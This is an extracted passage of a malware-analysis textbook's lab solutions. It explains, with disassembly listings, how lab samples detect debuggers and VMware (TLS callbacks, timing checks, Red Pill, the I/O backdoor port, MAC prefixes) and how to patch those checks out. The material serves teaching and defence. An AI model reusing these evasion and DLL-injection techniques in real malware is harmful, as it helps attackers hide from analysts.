BeingDebugged flag, select the byte, right-click, and select BinaryFill With 
00’s to set the byte to 0. 
You can use also the OllyDbg plug-in PhantOm to protect yourself from 
the NTGlobalFlag anti-debugging technique without the need to modify any 
settings.
[Word Count: 52]

Lab 16-1 uses three different anti-debugging techniques to attempt to thwart 
debugger analysis. The malware manually checks structures for telltale signs 
of debugger usage and performs the same three checks at the start of nearly 
every subroutine, which makes flipping single jump flags tedious when inside 
a debugger. As you’ve seen, the easiest way to defeat the malware is to change 
the structures in memory so that the check fails, and you can make this change 
either manually or with the PhantOm plug-in for OllyDbg.
[Word Count: 85]

1.
When you run Lab16-02.exe from the command line, it prints a usage 
string asking for a four-character password.
[Word Count: 19]

2.
If you input an incorrect password, the program will respond “Incorrect 
password, Try again.”
[Word Count: 15]

3.
The correct command-line password is byrr.
[Word Count: 7]

4.
The strncmp function is called at 0x40123A.
[Word Count: 8]

5.
The program immediately terminates when loaded into OllyDbg using 
the default settings.
[Word Count: 13]

8.
The FindWindowA function is used to terminate the malware. It looks for a 
window with the class name OLLYDBG and terminates the program if it is 
found. You can change the window class name using an OllyDbg plug-in 
like PhantOm, or NOP-out the call to exit at 0x40107C.
[Word Count: 49]

9.
At first, the password appears to be bzqr when you set a breakpoint at the 
strncmp call.
[Word Count: 18]

10. This password found in the debugger doesn’t work on the command line.
[Word Count: 13]

11. The result of OutputDebugStringA and the BeingDebugged flag are used as 
inputs to the decoding algorithm. You can use the PhantOm plug-in 
to ensure that the BeingDebugged flag is 0, and you can NOP-out the add 
instruction at 0x401051.
[Word Count: 40]

We first run the program from the command line and see the following 
printed to the screen:
[Word Count: 17]

usage: Lab16-02.exe <4 character password>
[Word Count: 5]

The program is expecting a four-character password. Next, we attempt to 
provide the password abcd on the command line, and get the following output:
[Word Count: 24]

Figure 16-4L: PEview displaying a TLS section for Lab 16-2
[Word Count: 10]

The TLS section contains callback functions that gain execution and 
prematurely terminate the program in OllyDbg. In IDA Pro, press CTRL-E to 
see the location of all entry points for the program, as shown in Figure 16-5L.
[Word Count: 37]

Figure 16-5L: PEview displaying a TLS section for Lab 16-2
[Word Count: 10]

Double-click the TLS callback function at 0x401060 to navigate directly to 
the function and see if there is any anti-debugging functionality. Listing 16-5L 
shows the TLS callback code.
[Word Count: 28]

00401063         cmp     [ebp+arg_4], 1
00401067         jnz     short loc_401081
00401069         push    0                       ; lpWindowName
0040106B         push    offset ClassName        ; "OLLYDBG"
00401070         call    ds:FindWindowA 
00401076         test    eax, eax
00401078         jz      short loc_401081
0040107A         push    0                       ; int
0040107C         call    _exit 
[Word Count: 40]

Listing 16-5L: FindWindowA check for system residue of OllyDbg
[Word Count: 9]

The TLS callback starts with a comparison of arg_4 to 1 to determine 
whether the TLS callback is being called as a result of the process starting up. 
(TLS callback functions are called at different times by the system.) In other 
words, this anti-debugging technique executes only during program startup. 
At , the callback calls the FindWindowA function with the class name 
OLLYDBG. This call makes it easy for the malware to see if OllyDbg is running
[Word Count: 77]

00401124         ror     encoded_password+2, 7
0040112B         mov     ebx, large fs:30h 
00401132         xor     encoded_password+3, 0C5h
...
0040117D         rol     encoded_password, 6
00401184         xor     encoded_password, 72h
0040118B         mov     bl, [ebx+2] 
0040118E         rol     encoded_password+1, 1
...
004011A2         add     encoded_password+2, bl 
[Word Count: 38]

Listing 16-6L: Decoding routine incorporating anti-debugging in its decoding
[Word Count: 9]

Returning to the decoding routine, we see that it uses a global variable, 
byte_40A968, as shown in Listing 16-7L.
[Word Count: 19]

0040109B         mov     bl, byte_40A968 
004010A1         or      al, 1
...
0040110A         rol     encoded_password, 2
00401111         add     encoded_password+1, bl 
[Word Count: 19]

Listing 16-7L: Global byte_40A968 used in the password decoding
[Word Count: 9]

At , byte_40A968 is moved into BL, and BL is used in the decoding code, 
as seen at . Double-clicking byte_40A968, we see that it is initialized to 0, but 
it has a cross-reference to sub_401020. That function is shown in Listing 16-8L.
[Word Count: 43]

00401024         mov     [ebp+dwErrCode], 3039h
0040102B         mov     eax, [ebp+dwErrCode]
0040102E         push    eax                     ; dwErrCode
0040102F         call    ds:SetLastError 
00401035         push    offset OutputString     ; "b"
0040103A         call    ds:OutputDebugStringA 
00401040         call    ds:GetLastError
00401046         cmp     eax, [ebp+dwErrCode] 
00401049         jnz     short loc_40105A
0040104B         mov     cl, byte_40A968 
00401051         add     cl, 1 
00401054         mov     byte_40A968, cl
[Word Count: 52]

Listing 16-8L: OutputDebugStringA anti-debugging technique
[Word Count: 5]

00401081         cmp     [ebp+arg_4], 2
00401085         jnz     short loc_40108C
00401087         call    sub_401020
[Word Count: 11]

Listing 16-9L: The check and call from within the TLS callback
[Word Count: 11]

The code in Listing 16-9L starts by comparing arg_4 to the number 2. 
Recall from our earlier discussion that arg_4 to the TLS callback is used to 
determine when the TLS callback is made: 1 is used for when the process is 
starting up, 2 for when a thread is starting up, and 3 when the process is 
being terminated. Therefore, this TLS callback was called again when the 
CreateThread executed and caused the OutputDebugStringA to execute.
[Word Count: 77]

To finally get the password, we start with our OllyDbg PhantOm plug-in 
installed and set up to protect us from the BeingDebugged flag check and 
the FindWindow check. We load the program into OllyDbg, NOP-out the add 
instruction at 0x401051, and set a breakpoint at the strncmp call (0x40123A). 
This time, the password appears to be byrr. Trying this on the command line, 
we get the following message:
[Word Count: 68]

1.
There aren’t many useful strings in the malware other than import func-
tions and the strings cmd and cmd.exe.
[Word Count: 20]

2.
When you run this malware, it appears to do nothing other than 
terminate.
[Word Count: 14]

3.
You must rename the malware to peo.exe for it to run properly.
[Word Count: 13]

4.
This malware uses three different anti-debugging timing techniques: 
rdtsc, GetTickCount, and QueryPerformanceCounter.
[Word Count: 13]

5.
If the QueryPerformanceCounter check is successful, the malware modifies 
the string needed for the program to run properly. If the GetTickCount 
check is successful, the malware causes an unhandled exception that 
crashes the program. If the rdtsc check is successful, the malware will 
attempt to delete itself from disk.
[Word Count: 50]

6.
The anti-debugging timing checks are successful because the malware 
causes and catches an exception that it handles by manipulating the 
Structured Exception Handling (SEH) mechanism to include its own 
exception handler in between two calls to the timing checking functions. 
Exceptions are handled much more slowly in a debugger than outside a 
debugger.
[Word Count: 54]

7.
The malware uses the domain name adg.malwareanalysisbook.com.
[Word Count: 8]

As noted in the lab description, this malware is the same as Lab09-02.exe, 
except with added anti-debugging techniques. A good place to start is by
[Word Count: 25]

doing Lab 9-2 or by reviewing your answers to refresh your memory of this 
malware’s capabilities.
Static analysis of Lab16-03.exe shows it to be similar to Lab09-02.exe, with 
few strings visible other than cmd.exe. When we load Lab16-03.exe into IDA 
Pro, we see that much of the same functionality is present in this malware. 
Listing 16-10L shows the malware using gethostbyname to resolve a domain 
and using port 9999, as with Lab 9-2.
[Word Count: 73]

004015DB         call    ds:gethostbyname
...
0040160D         push    9999                    ; hostshort
00401612         call    ds:htons
[Word Count: 12]

Listing 16-10L: Same calls from Lab 9-2, which resolve a domain name and get a port in 
network byte order
[Word Count: 20]

0040150A         mov     ecx, [ebp+Str2] 
00401510         push    ecx                     ; Str2
00401511         lea     edx, [ebp+Str1] 
00401517         push    edx                     ; Str1
00401518         call    _strncmp
[Word Count: 23]

Listing 16-11L: Using strncmp for the module name comparison
[Word Count: 9]

We need to review the sub_4011E0 function (where the ocl.exe string was 
passed) before the strncmp function. Examining sub_4011E0, we see that it 
calls QueryPerformanceCounter twice, as shown in Listing 16-12L (in bold).
[Word Count: 33]

00401219         lea     eax, [ebp+PerformanceCount]
0040121C         push    eax                     ; lpPerformanceCount
0040121D         call    ds:QueryPerformanceCounter
...
0040126A         lea     ecx, [ebp+var_110]
00401270         push    ecx                     ; lpPerformanceCount
00401271         call    ds:QueryPerformanceCounter
00401277         mov     edx, [ebp+var_110]
0040127D         sub     edx, dword ptr [ebp+PerformanceCount] 
00401280         mov     [ebp+var_114], edx
00401286         cmp     [ebp+var_114], 4B0h 
00401290         jle     short loc_40129C
00401292         mov     [ebp+var_118], 2 
[Word Count: 54]

Listing 16-12L: Anti-debugging timing check using QueryPerformanceCounter
[Word Count: 7]

00401223         call    $+5
00401228         pop     eax
00401229         xor     ecx, ecx
0040122B         mov     edi, eax
0040122D         xor     ebx, ebx
0040122F         add     ebx, 2Ch 
00401232         add     eax, ebx
00401234         push    eax 
00401235         push    large dword ptr fs:0
0040123C         mov     large fs:0, esp 
00401243         div     ecx
00401245         sub     edi, 0D6Ah
[Word Count: 50]

0040124B         mov     ecx, 0Ch
00401250         jmp     short loc_401262
00401252         repne stosb
00401254         mov     ecx, [esp+0Ch] 
00401258         add     dword ptr [ecx+0B8h], 2
0040125F         xor     eax, eax
00401261         retn
00401262         pop     large dword ptr fs:0 
00401269         pop     eax
[Word Count: 38]

Listing 16-13L: Malware setting its own exception handler and triggering an exception
[Word Count: 12]

Next, we set a breakpoint at gethostbyname at 0x4015DB in order to see the 
domain name used by the malware, and we see that the malware terminates 
without hitting the breakpoint. Examining the code in the main function, we 
see two calls to GetTickCount, as shown in Listing 16-14L (in bold).
[Word Count: 51]

00401584         call    ds:GetTickCount
0040158A         mov     [ebp+var_2B4], eax
00401590         call    sub_401000 
00401595         call    ds:GetTickCount
0040159B         mov     [ebp+var_2BC], eax
004015A1         mov     ecx, [ebp+var_2BC]
004015A7         sub     ecx, [ebp+var_2B4]
004015AD         cmp     ecx, 1 
004015B0         jbe     short loc_4015B7 
004015B2         xor     eax, eax
004015B4         mov     [eax], edx 
004015B6         retn
[Word Count: 47]

Listing 16-14L: Anti-debugging timing check using GetTickCount
[Word Count: 7]

Between the two calls to GetTickCount, the call to sub_401000 at  contains 
the same SEH manipulation code we saw in the QueryPerformanceCounter method 
we analyzed previously. Next, at , the malware compares the result of the 
time difference in milliseconds. If the time difference exceeds one millisec-
ond, the code executes the instruction at , which is illegal because EAX is 
set to 0 in the previous instruction. This causes the malware to crash. To fix 
this, we just need to make sure that the jump at  is taken.
[Word Count: 91]

Examining the decoding method sub_401300, we see that the code in Lab 16-3 
differs from the decoding method in Lab 9-2. In Lab 16-3, we find that the 
rdtsc instruction is used twice, and the familiar SEH manipulation code is in 
between. The rdtsc instructions are shown in Listing 16-15L (in bold), and 
we have omitted the SEH manipulation code from the listing.
[Word Count: 63]

00401323         rdtsc
00401325         push    eax 
...                               
0040136D         rdtsc
0040136F         sub     eax, [esp+20h+var_20] 
00401372         mov     [ebp+var_4], eax 
00401375         pop     eax
00401376         pop     eax
00401377         cmp     [ebp+var_4], 7A120h 
0040137E         jbe     short loc_401385
00401380         call    sub_4010E0 
[Word Count: 37]

Listing 16-15L: Anti-debugging timing check using rdtsc
[Word Count: 7]

Lab 16-3 uses three different anti-debugging techniques to thwart analysis 
of the malware inside a debugger: QueryPerformanceCounter, GetTickCount, and 
rdtsc. The easiest way to beat this malware at its own game is to NOP-out the 
jumps or force them to be taken by changing them from conditional to non-
conditional jumps. Once we figure out how to rename the malware (to peo.exe) 
in a debugger, we can exit the debugger, rename the file, and effectively use 
basic dynamic analysis techniques.
[Word Count: 80]

1.
This malware uses vulnerable x86 instructions to determine if it is run-
ning in a VM.
[Word Count: 17]

2.
The script finds three potential anti-VM instructions and highlights them 
in red: sidt, str, and sldt.
[Word Count: 17]

3.
The malware will delete itself if either sidt or str detects VMware. If the 
sldt instruction detects malware, the malware will exit without creating 
its main thread, but it will create the malicious service MalService.
[Word Count: 36]

4.
On our machine running VMware Workstation 7 on an Intel Core i7, 
none of the techniques succeeded. Your results will vary depending on 
the hardware and software you use.
[Word Count: 30]

5.
See the detailed analysis for an explanation of why each technique did or 
didn’t work.
[Word Count: 16]

6.
You can NOP-out the sidt and str instructions or flip the jump flags live 
while debugging the malware.
[Word Count: 19]

Because this malware is the same as Lab07-01.exe except with added anti-VM 
techniques, a good place to begin your analysis is with Lab 7-1. Scanning the 
malware for new functions, we find two: sub_401000, a self-deletion method, 
and sub_401100, which appears to call the sldt instruction. We can run Lab17-
01.exe in a VM and see what happens differently from Lab 7-1. The dynamic 
analysis results vary from system to system and might be identical to Lab 7-1 
on your machine.
[Word Count: 81]

We can automatically search for vulnerable x86 instructions using IDA Pro’s 
Python scripting capability (available in the commercial version). Create 
your own script using Listing 17-4 in Chapter 17, or use the script named 
findAntiVM.py provided with the labs. To run the script in IDA Pro, select 
FileScript File and open findAntiVM.py. You should see the following in 
IDA Pro’s output window:
[Word Count: 62]

Number of potential Anti-VM instructions: 3
[Word Count: 6]

This output indicates that the script detected three vulnerable instruc-
tion types. Scrolling through the disassembly window in IDA Pro, we see 
three instructions highlighted in red: sidt, str, and sldt. (If you don’t have 
the commercial version of IDA Pro, search for these instructions using 
SearchText.)
We’ll analyze each vulnerable instruction, focusing on what happens if 
the VM technique succeeds, how to defeat it, and why it does or doesn’t work 
on our machine.
[Word Count: 75]

The sidt instruction (also known as Red Pill) is the first vulnerable instruc-
tion we encounter in this malware, as shown in Listing 17-1L at . This 
instruction stores the most significant 4 bytes of the sidt result var_420 at  
for later use in the code.
[Word Count: 47]

004011B5         sidt    fword ptr [ebp+var_428] 
004011BC         mov     eax, dword ptr [ebp+var_428+2]
004011C2         mov     [ebp+var_420], eax 
[Word Count: 17]

Listing 17-1L: Red Pill being used in Lab 17-1
[Word Count: 9]

The malware checks for a VM a few instructions later in the binary, as 
you can see in Listing 17-2L.
[Word Count: 20]

004011DD                 mov     ecx, [ebp+var_420]
004011E3                 shr     ecx, 18h 
004011E6                 cmp     ecx, 0FFh
004011EC                 jz      loc_40132F 
[Word Count: 17]

Listing 17-2L: Comparison and conditional jump checking after using the sidt instruction
[Word Count: 12]

The str instruction is the second vulnerable instruction in this malware, as 
seen at line 0x401204:
[Word Count: 16]

00401204        str     word ptr [ebp+var_418]
[Word Count: 5]

The str instruction loads the task state segment (TSS) into the 4-byte 
local variable var_418. The malware doesn’t use this local variable again until 
just after the call to GetModuleFileName. 
If the str instruction succeeds, the malware will not create the MalService 
service. Listing 17-3L shows the check against the first 2 bytes, which must 
equal 0  and 0x40  in order to match the signature for VMware.
[Word Count: 69]

00401229                 mov     edx, [ebp+var_418]
0040122F                 and     edx, 0FFh
00401235                 test    edx, edx 
[Word Count: 13]

00401237                 jnz     short loc_40124E
00401239                 mov     eax, [ebp+var_418+1]
0040123F                 and     eax, 0FFh
00401244                 cmp     eax, 40h 
00401247                 jnz     short loc_40124E
00401249                 jmp     loc_401338
[Word Count: 24]

Listing 17-3L: Checking the results of the str instruction
[Word Count: 9]

This check failed in our environment. When we set a breakpoint at 
0x40122F, we saw that var_418 contained 0x28, not 0x4000, the signature 
for VMware. 
If the str instruction check succeeds in your environment, NOP-out the 
str instruction or force the jnz at 0x401237 to jump in a debugger at runtime.
[Word Count: 51]

The sldt instruction (also known as No Pill) is the final anti-VM technique 
used in this malware. This technique is found in the function labeled 
sub_401100 by IDA Pro. Listing 17-4L shows the sldt usage within sub_401100.
[Word Count: 37]

00401109         mov     eax, dword_406048 ;0xDDCCBBAA
0040110E         mov     [ebp+var_8], eax 
...
00401121         sldt    word ptr [ebp+var_8]
00401125         mov     edx, [ebp+var_8]
00401128         mov     [ebp+var_C], edx
0040112B         mov     eax, [ebp+var_C] 
[Word Count: 29]

Listing 17-4L: Setup and execution of the sldt instruction
[Word Count: 9]

As you can see, var_8 is set to EAX at , and EAX was set to dword_406048 
in the previous instruction. dword_406048 contains an initialization constant 
(0xDDCCBBAA). The result of the sldt instruction is stored in var_8 and is 
ultimately moved into EAX at .
After this function returns, the result is compared to see if the low-order 
bits of the initialization constant are set to zero, as shown in Listing 17-5L 
at . If the low-order bytes are not zero, the jump will be taken, and the mal-
ware will terminate without creating the thread.
[Word Count: 96]

004012D1         call    sub_401100
004012D6         cmp     eax, 0DDCC0000h 
004012DB         jnz     short loc_40132B
[Word Count: 12]

Listing 17-5L: Checking the result of the sldt instruction execution
[Word Count: 10]

This check failed in our environment. When we set a breakpoint at 
0x4012D6, we found that EAX was equal to 0xDDCC0000, which meant 
that the check for a VM failed. 
If No Pill is effective in your environment, you will need to NOP-out the 
three instructions in Listing 17-5L or force the jnz to not jump in a debugger.
[Word Count: 59]

1.
The exports are InstallRT, InstallSA, InstallSB, PSLIST, ServiceMain, 
StartEXS, UninstallRT, UninstallSA, and UninstallSB.
[Word Count: 14]

2.
The DLL is deleted from the system using a .bat file.
[Word Count: 12]

3.
A .bat file containing self-deletion code is created, as well as a file named 
xinstall.log containing the string "Found Virtual Machine, Install Cancel".
[Word Count: 24]

4.
This malware queries the VMware backdoor I/O communication port 
using the magic value VX and the action 0xA by using the in x86 instruction.
[Word Count: 25]

5.
To get the malware to install, patch the in instruction at 0x100061DB at 
runtime.
[Word Count: 15]

6.
To permanently disable the VM check, use a hex editor to modify the 
static string in the binary from [This is DVM]5 to [This is DVM]0. Alterna-
tively, NOP-out the check in OllyDbg and write the change to disk.
[Word Count: 40]

7.
InstallRT performs installation via DLL injection with an optional param-
eter containing the process to inject into. InstallSA performs installation 
via service installation. InstallSB performs installation via service install 
and DLL injection if the service to overwrite is still running.
[Word Count: 41]

InstallRT   InstallSA   InstallSB
PSLIST
ServiceMain
StartEXS
UninstallRT   UninstallSA   UninstallSB
[Word Count: 9]

The ServiceMain function in the export list tells us that this malware prob-
ably can be run as a service. The names of the installation exports that end in 
the strings SA and SB may be the methods related to service installation.
[Word Count: 42]

We attempt to run this malware and monitor it using dynamic analysis 
techniques. Using procmon, we set a filter on rundll32.exe (since we will use it 
to run the malware from the command line), and then run the following 
from the command line within our VM:
[Word Count: 46]

We immediately notice that the malware is deleted from the system and 
a file xinstall.log is left behind. This file contains the string "Found Virtual 
Machine, Install Cancel", which means that there is an anti-VM technique in 
the binary.
[Word Count: 39]

NOTE
You will sometimes encounter logging capability in real malware because logging errors 
can help malware authors determine what they need to change in order for their attack 
to succeed. Also, by logging the result of the various system configurations they encoun-
ter, such as VMs, attackers can identify issues they may encounter during an attack.
[Word Count: 56]

When we check our procmon output, we see that the malware created 
the file vmselfdel.bat for the malware to delete itself. When we load the mal-
ware into IDA Pro and follow the cross-references back from the vmselfdel.bat 
string, we reach sub_10005567, which shows the self-deletion scripting code 
that is written to the .bat file.
Next, we focus on determining why the malware deleted itself. We can 
use the findAntiVM.py script from the previous lab or work backward through 
the code by examining the cross-references to sub_10005567 (the vmselfdel.bat 
creation method). Let’s examine the cross-references, as shown in Figure 17-1L.
[Word Count: 100]

Figure 17-1L: Cross-reference to sub_100055567
[Word Count: 5]

As you can see in Figure 17-1L, there are three cross-references to this 
function, each of which is located in a different export from the malware. 
Following the cross-reference to InstallRT, we see the code shown in 
Listing 17-6L in the InstallRT export function.
[Word Count: 44]

1000D870         push    offset unk_1008E5F0 ; char *
1000D875       call    sub_10003592
1000D87A       mov     [esp+8+var_8], offset aFoundVirtualMa ; "Found Virtual Machine,..."
1000D881       call    sub_10003592
1000D886         pop     ecx
1000D887       call    sub_10005567
1000D88C         jmp     short loc_1000D8A4
[Word Count: 32]

Listing 17-6L: Anti-VM check inside InstallRT
[Word Count: 6]

The call at  is to the vmselfdel.bat function. At , we see a reference to 
the string we found earlier in xinstall.log, as shown in bold. Examining the
[Word Count: 29]

functions at  and , we see that  opens xinstall.log and  logs "Found 
Virtual Machine, Install Cancel" to the file. 
Examining the code section shown in Listing 17-6L in graph mode, we 
see two code paths to it, both conditional jumps after the calls to sub_10006119 
or sub_10006196. Because the function sub_10006119 is empty, we know that 
sub_10006196 must contain our anti-VM technique. Listing 17-7L shows a sub-
set of the instructions from sub_10006196.
[Word Count: 76]

100061C7         mov     eax, 564D5868h  ;'VMXh' 
100061CC         mov     ebx, 0
100061D1         mov     ecx, 0Ah
100061D6         mov     edx, 5658h  ;'VX' 
100061DB         in      eax, dx 
100061DC         cmp     ebx, 564D5868h  ;'VMXh' 
100061E2         setz    [ebp+var_1C]
...
100061FA         mov     al, [ebp+var_1C]
[Word Count: 39]

Listing 17-7L: Querying the I/O communication port
[Word Count: 7]

1000D847         mov     eax, off_10019034 ; [This is DVM]5
1000D84C         push    esi
1000D84D         mov     esi, ds:atoi
1000D853         add     eax, 0Dh 
1000D856         push    eax     ; Str
1000D857         call    esi     ; atoi
1000D859         test    eax, eax 
1000D85B         pop     ecx
1000D85C         jz      short loc_1000D88E 
[Word Count: 43]

Listing 17-8L: Checking the DVM static configuration option
[Word Count: 8]

The code uses atoi (shown in bold) to turn a string into a number. The 
number is parsed out of the string [This is DVM]5 (also shown in bold). The 
reference to [This is DVM]5  is loaded into EAX, and EAX is advanced by 0xD 
at , which moves the string pointer to the 5 character, which is turned into 
the number 5 with the call to atoi. The test at  checks to see if the number 
parsed is 0.
[Word Count: 81]

NOTE
DVM is a static configuration option. If we open the malware in a hex editor, we can 
manually change the string to read [This is DVM]0, and the malware will no longer 
perform the anti-VM check.
[Word Count: 37]

The following excerpt shows a subset of the static configuration options 
in Lab17-02.exe, with a domain name and port 80 shown in bold. The LOG 
option (also shown in bold) is probably used by the malware to determine 
if xinstall.log should be created and used.
[Word Count: 45]

[This is RNA]newsnews
[This is RDO]newsnews.practicalmalwareanalysis.com
[This is RPO]80
[This is DVM]5
[This is SSD]
[This is LOG]1
[Word Count: 18]

We’ll complete our analysis of InstallRT by analyzing the method 
sub_1000D3D0. This method is long, but all of its imported functions and 
logging strings make the analysis process much easier. 
The sub_1000D3D0 method begins by copying the malware into the 
Windows system directory. As shown in Listing 17-9L, InstallRT takes an 
optional argument. The strlen at  checks the string length of the argu-
ment. If the string length is 0 (meaning no argument), iexplore.exe is used 
(shown in bold).
[Word Count: 80]

1000D50E         push    [ebp+process_name]      ; Str
1000D511         call    strlen 
1000D516         test    eax, eax
1000D518         pop     ecx
1000D519         jnz     short loc_1000D522
1000D51B         push    offset aIexplore_exe    ; "iexplore.exe"
[Word Count: 26]

Listing 17-9L: Argument used as the target process name with iexplore.exe as the default
[Word Count: 14]

The export argument (or iexplore.exe) is used as a target process for 
DLL injection of this malware. At 0x1000D53A, the malware calls a function 
to find the target process in the process listing. If the process is found, the 
malware uses the process’s PID in the call to sub_1000D10D, which uses a com-
mon process injection trio of calls: VirtualAllocEx, WriteProcessMemory, and 
CreateRemoteThread. We conclude that InstallRT performs DLL injection to 
launch the malware, which we confirm by running the malware (after patch-
ing the static DVM option) and using Process Explorer to see the DLL load 
into another process.
[Word Count: 100]

Figure 17-2L: Registry overwrite of the ServiceDLL for Irmon
[Word Count: 9]

1.
The malware immediately terminates inside a VM, unlike Lab 12-2, 
which performs process replacement on svchost.exe.
[Word Count: 17]

2.
If you force the jumps at 0x4019A1, 0x4019C0, and 0x401467 to be taken, 
and the jump at 0x401A2F to not be taken, the malware performs pro-
cess replacement using a keylogger from its resource section.
[Word Count: 36]

3.
The malware uses four different anti-VM techniques:
[Word Count: 8]


It uses the backdoor I/O communication port.
[Word Count: 8]


It searches the registry key SYSTEM\CurrentControlSet\Control\
DeviceClasses for the string vmware.
[Word Count: 12]


It checks the MAC address to see if it is the default used by VMware.
[Word Count: 16]


It searches the process list with a string-hashing function for pro-
cesses starting with the string vmware.
[Word Count: 18]

4.
To avoid the anti-VM techniques used by this malware, you can remove 
VMware tools and modify the MAC address.
[Word Count: 20]

5.
In OllyDbg, you can apply the following patches:
[Word Count: 9]


Change the instructions at 0x40199F and 0x4019BE to xor eax, eax.
[Word Count: 12]


Modify the instruction at 0x40169F to jmp 0x40184A.
[Word Count: 9]

As noted in the lab description, this malware is the same as Lab12-02.exe 
except that it includes anti-VM techniques. Therefore, a good place to start 
is with a review of Lab 12-2.
[Word Count: 32]

We begin by loading the binary into IDA Pro and searching for vulnerable 
x86 instructions using findAntiVM.py (as in Lab 17-1). This script identifies 
one anti-VM instruction at 0x401AC8 and highlights it in red. We notice 
that this is the backdoor I/O communication port being queried via the in 
instruction. This anti-VM technique is contained in the function named 
sub_401A80 by IDA Pro. This function returns 1 if it is executing inside a VM; 
otherwise, it returns 0. There is only one cross-reference from the begin-
ning of the main function, as shown at  in Listing 17-10L.
[Word Count: 98]

0040199A         call    sub_401A80    ; Query I/O communication port 
0040199F         test    eax, eax 
004019A1         jz      short loc_4019AA 
004019A3         xor     eax, eax
004019A5         jmp     loc_401A71
[Word Count: 26]

Listing 17-10L: The check after the call to query the I/O communication port
[Word Count: 13]

The jz instruction at  must be taken, or the main method will terminate 
immediately by jumping to 0x401A71. We disable this anti-VM technique by 
setting the zero flag to 1 when execution arrives at the jz instruction. To per-
manently disable this technique, change the test instruction at  into xor 
eax, eax as follows:
[Word Count: 56]

1.
Start OllyDbg and place your cursor on line 0x40199F.
[Word Count: 10]

2.
Press the spacebar and enter xor eax, eax in the text box.
[Word Count: 13]

Finding Anti-VM Techniques Using Strings
[Word Count: 5]

Next, we use Strings to compare the output from Lab 12-2 to the output from 
Lab17-03.exe. The following are the new strings found in this lab:
[Word Count: 26]

vmware
SYSTEM\CurrentControlSet\Control\DeviceClasses
Iphlpapi.dll
GetAdaptersInfo
[Word Count: 4]

Figure 17-3L: Cross-reference graph for sub_4011C0
[Word Count: 6]

Listing 17-11L shows where sub_4011C0 is called at  inside the main func-
tion. Three parameters are pushed onto the stack before the call, including 
the registry key, which we saw in the strings listing.
[Word Count: 35]

004019AA         push    2                ; int
004019AC         push    offset SubKey    ; "SYSTEM\\CurrentControlSet\\Control\\Device"...
004019B1         push    80000002h        ; hKey
004019B6         call    sub_4011C0 
004019BB         add     esp, 0Ch
004019BE         test    eax, eax 
004019C0         jz      short loc_4019C9 
[Word Count: 34]

Listing 17-11L: The parameters for sub_4011C0 and the check after
[Word Count: 10]

004019C9         push    offset aGetadaptersinf  ; "GetAdaptersInfo" 
004019CE         push    offset LibFileName      ; "Iphlpapi.dll"
004019D3         call    ds:LoadLibraryA
004019D9         push    eax                     ; hModule
004019DA         call    ds:GetProcAddress
004019E0         mov     GetAdaptersInfo_Address , eax
[Word Count: 29]

Listing 17-12L: The dynamic resolution of GetAdaptersInfo
[Word Count: 7]

004016A8        mov     [ebp+var_38], 0 
004016AC        mov     [ebp+var_37], 50h
004016B0        mov     [ebp+var_36], 56h
004016B4        mov     [ebp+var_35], 0
004016B8        mov     [ebp+var_34], 0Ch
004016BC        mov     [ebp+var_33], 29h
...
0040170C        mov     [ebp+var_1F], 0
00401710        mov     [ebp+var_1E], 27h
00401714        mov     [ebp+dwBytes], 0
0040171B        lea     eax, [ebp+dwBytes]
0040171E        push    eax
0040171F        push    0
00401721        call    GetAdaptersInfo_Address 
[Word Count: 52]

Listing 17-13L: Byte array initialization and first call to GetAdaptersInfo_Address
[Word Count: 10]

0040174B         call    ds:HeapAlloc 
00401751         mov     [ebp+lpMem], eax 
00401754         cmp     [ebp+lpMem], 0
...
00401766         lea     edx, [ebp+dwBytes]
00401769         push    edx
0040176A         mov     eax, [ebp+lpMem]
0040176D         push    eax
0040176E         call    GetAdaptersInfo_Address 
[Word Count: 32]

Listing 17-14L: Second call to GetAdaptersInfo_Address, which populates the results
[Word Count: 10]

004017CC         jmp     short loc_4017D7
004017CE         mov     edx, [ebp+var_3C]
004017D1         add     edx, 3 
004017D4         mov     [ebp+var_3C], edx
...
004017DD         mov     ecx, 3 
004017E2         mov     eax, [ebp+var_3C] 
004017E5         lea     edi, [ebp+eax+Byte_Array] 
004017E9         mov     esi, [ebp+lpMem]
004017EC         add     esi, 194h  
004017F2         xor     edx, edx
004017F4         repe cmpsb
004017F6         jnz     short loc_401814
[Word Count: 52]

Listing 17-15L: Comparing the adapter address to Byte_Array
[Word Count: 8]

To make this code more readable, right-click the 194h at  and change it 
to IP_ADAPTER_INFO.Address. 
The code is comparing the currently referenced IP_ADAPTER_INFO’s address 
to an index in Byte_Array. Byte_Array is indexed at  using EAX, which is filled 
with var_3C, a loop counter that we see incremented by 3 at . The repe cmpsb 
instruction compares Byte_Array to the IP_ADAPTER_INFO.Address for 3 bytes 
(because ECX is set to 3 at ), which means it is checking to see if the first 
3 bytes of the MAC address are {00h,50h,56h} or {00h,0Ch,29h} and so on. An
[Word Count: 97]

Table 17-1L: Before and After Applying Structure Information and Standard Constants
[Word Count: 11]

mov    edx, [ebp+lpMem]
cmp    dword ptr [edx+1A0h], 6
jz     short loc_4017B9
mov    eax, [ebp+lpMem]
cmp    dword ptr [eax+1A0h], 71h
jnz    short loc_401816
mov    ecx, [ebp+lpMem]
cmp    dword ptr [ecx+190h], 2
jbe    short loc_401816
[Word Count: 33]

mov    edx, [ebp+lpMem]
cmp    [edx+IP_ADAPTER_INFO.Type], MIB_IF_TYPE_ETHERNET
jz     short loc_4017B9
mov    eax, [ebp+lpMem]
cmp    [eax+IP_ADAPTER_INFO.Type], IF_TYPE_IEEE80211
jnz    short loc_401816
mov    ecx, [ebp+lpMem]
cmp    [ecx+IP_ADAPTER_INFO.AddressLength], 2
jbe    short loc_401816
[Word Count: 27]

Internet search for “00,0C,29” tells us that it is a common start of the default 
MAC address for VMware. Since the array is of size 27, we know that this code 
compares nine different MAC addresses (most associated with VMware).
We permanently disable this check by avoiding the MAC address com-
parisons altogether. Modify the jnz instruction at 0x40169F to be jmp 0x40184A 
using OllyDbg’s Assemble functionality, as we did earlier to force the mal-
ware to skip the adapter checks and go straight to the resource section 
manipulation code.
[Word Count: 90]

The final anti-VM check in this malware is in sub_401400, which performs pro-
cess replacement. The code in Listing 17-16L shows a call at , which deter-
mines if the jz at  will be taken. If the jump is not taken, the code will 
terminate without performing the process replacement.
[Word Count: 51]

00401448         xor     eax, eax 
...
00401456         push    6
00401458         push    0F30D12A5h
0040145D         call    sub_401130 
00401462         add     esp, 8
00401465         test    eax, eax
00401467         jz      short loc_401470 
[Word Count: 29]

As shown in Listing 17-16L, the anti-VM function sub_401130 takes 
two parameters: 6 and the integer 0xF30D12A5. This function loops through 
the process listing by calling CreateToolhelp32Snapshot, Process32First, and 
Process32Next. Process32Next is inside a loop with the code shown in 
Listing 17-17L.
